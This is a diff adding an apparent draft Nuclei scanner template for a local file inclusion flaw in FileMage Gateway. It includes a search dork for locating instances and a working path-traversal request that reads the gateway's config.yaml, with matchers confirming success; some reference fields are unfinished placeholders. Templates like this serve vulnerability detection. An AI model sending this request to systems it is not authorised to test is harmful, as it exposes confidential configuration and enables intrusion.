@@ -1,0 +1,31 @@
+id: TBDCVE
+
+info:
+  name: File Mage Gateway LFI
+  author: Bryce Harty ("Raindayzz")
+  severity: high
+  description: Azure Instances of FileMage Gateway are vulnerable to a Local File Inclusion (LFI) vulnerability which allows remote unauthenticate attackers to view important, confidnetial information.
+  reference:
+    - exploitdb?
+    - FM bug page
+    - BlogPost
+  metadata:
+    google-dork: intitle:"Filemage Gateway"
+  tags: lfi, cve, etc
+
+requests:
+  - raw:
+      - |
+        GET /mgmnt/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cprogramdata%5cfilemage%5cgateway%5cconfig.yaml HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{BaseURL}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "tls"
+
+      - type: status
+        status:
+          - 200
